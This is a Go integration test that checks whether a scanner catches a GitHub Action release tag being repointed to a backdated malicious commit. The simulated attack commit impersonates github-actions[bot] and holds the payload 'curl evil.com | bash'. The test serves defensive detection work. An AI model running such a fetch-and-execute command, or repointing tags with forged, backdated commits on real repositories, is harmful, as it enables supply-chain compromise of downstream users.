// Copyright (C) 2026 CoreWeave, Inc.
// SPDX-License-Identifier: GPL-3.0-only

//go:build integration

package harness

import (
	"testing"
)

// ImpossibleTimestamp tests that a commit with author date 2022 but
// parent date 2026 triggers detection. This is a common attack pattern
// where the attacker backdates the malicious commit to look old, but
// the parent commit reveals the true timeline.
type ImpossibleTimestamp struct{}

func (s *ImpossibleTimestamp) Name() string { return "impossible-timestamp" }

func (s *ImpossibleTimestamp) Setup(t *testing.T, h *TestHelper, repo, initSHA, initTree string) *ScenarioState {
	t.Helper()
	r := repoName(repo)

	// Create a legitimate action with a tag
	blob := h.CreateBlob(t, r, "#!/bin/bash\necho ok\n")
	tree := h.CreateTree(t, r, initTree, map[string]string{"entrypoint.sh": blob})
	goodCommit := h.CreateCommit(t, r, "Initial release", tree, []string{initSHA})
	h.UpdateBranch(t, r, "main", goodCommit)
	h.CreateLightweightTag(t, r, "v1.0.0", goodCommit)

	cfg := writeConfig(t, repo, []string{"v1.0.0"})
	return &ScenarioState{
		TagSHAs:    map[string]string{"v1.0.0": goodCommit},
		ConfigPath: cfg,
		StatePath:  t.TempDir() + "/state.json",
	}
}

func (s *ImpossibleTimestamp) Attack(t *testing.T, h *TestHelper, repo string, state *ScenarioState) {
	t.Helper()
	r := repoName(repo)

	// Create evil commit backdated to 2022, but with parent from today (2026)
	// This creates an impossible timeline: child is older than parent
	goodCommit := state.TagSHAs["v1.0.0"]
	evilBlob := h.CreateBlob(t, r, "#!/bin/bash\ncurl evil.com | bash\n")
	initTree := h.GetCommitTree(t, r, goodCommit)
	evilTree := h.CreateTree(t, r, initTree, map[string]string{"entrypoint.sh": evilBlob})

	evilCommit := h.CreateCommitWithAuthor(t, r,
		"Upgrade dependencies (#1234)", evilTree,
		[]string{goodCommit}, // parent is recent (2026)
		"github-actions[bot]", "41898282+github-actions[bot]@users.noreply.github.com",
		"2022-06-15T10:30:00Z", // backdated to 2022
	)
	h.RepointTag(t, r, "v1.0.0", evilCommit)
	state.EvilSHA = evilCommit
}

func (s *ImpossibleTimestamp) Verify(t *testing.T, h *TestHelper, repo string, state *ScenarioState) {
	t.Helper()
	output, code := RunPinpointScan(t, state.ConfigPath, state.StatePath)
	if code != 2 {
		t.Fatalf("Expected exit 2, got %d. Output:\n%s", code, output)
	}
	assertContains(t, output, "TAG_REPOINTED")
	assertContains(t, output, "BACKDATED_COMMIT")
	// TODO: Once spec 019 is implemented, also assert:
	// assertContains(t, output, "IMPOSSIBLE_TIMESTAMP")
}
